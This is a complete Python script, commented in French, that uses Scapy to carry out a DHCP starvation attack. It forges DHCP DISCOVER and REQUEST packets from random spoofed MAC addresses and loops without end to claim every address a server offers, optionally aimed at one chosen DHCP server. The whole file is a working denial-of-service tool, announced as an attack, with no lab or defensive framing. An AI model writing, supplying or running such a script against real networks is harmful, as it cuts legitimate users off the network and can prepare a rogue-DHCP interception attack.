from scapy.all import *
import random

def random_mac():
    """Génère une adresse MAC aléatoire"""
    return "02:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0x00, 0x7f),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff)
    )

def send_dhcp_discover(interface, target_dhcp=None):
    """Envoie un DHCP DISCOVER et attend un DHCP OFFER"""
    mac = random_mac()
    xid = random.randint(1, 0xFFFFFFFF)

    discover = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
               IP(src="0.0.0.0", dst="255.255.255.255") / \
               UDP(sport=68, dport=67) / \
               BOOTP(chaddr=mac2str(mac), xid=xid) / \
               DHCP(options=[("message-type", "discover"), "end"])

    print(f"1 - Envoi de DHCP DISCOVER avec MAC: {mac}")

    sendp(discover, iface=interface, verbose=False)

    # Écoute la réponse du serveur
    response = sniff(filter="udp and (port 67 or port 68)", iface=interface, timeout=3, count=1)

    for pkt in response:
        if pkt.haslayer(DHCP):
            if pkt[DHCP].options[0][1] == 2:  # DHCP OFFER reçu
                print(f"2 - DHCP OFFER reçu de {pkt[IP].src} pour {pkt[BOOTP].yiaddr}")
                
                if target_dhcp and pkt[IP].src != target_dhcp:
                    print("Ce n'est pas le DHCP cible, on ignore.")
                    return

                # Envoi de la requête DHCP REQUEST pour bloquer l'IP
                send_dhcp_request(interface, mac, xid, pkt[BOOTP].yiaddr, pkt[IP].src)

def send_dhcp_request(interface, mac, xid, offered_ip, dhcp_server):
    """Forge un DHCP REQUEST pour s'approprier l'IP"""
    request = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
              IP(src="0.0.0.0", dst="255.255.255.255") / \
              UDP(sport=68, dport=67) / \
              BOOTP(chaddr=mac2str(mac), xid=xid) / \
              DHCP(options=[("message-type", "request"),
                            ("server_id", dhcp_server),
                            ("requested_addr", offered_ip),
                            "end"])

    print(f"3 - Demande l'IP {offered_ip} au serveur {dhcp_server}")

    sendp(request, iface=interface, verbose=False)

def dhcp_starvation(interface, target_dhcp=None):
    """Boucle infinie pour vider le pool DHCP"""
    while True:
        send_dhcp_discover(interface, target_dhcp)

if __name__ == "__main__":
    import sys
    interface = sys.argv[1]
    target_dhcp = sys.argv[2] if len(sys.argv) > 2 else None

    print("Lancement de l'attaque DHCP Starvation...")
    dhcp_starvation(interface, target_dhcp)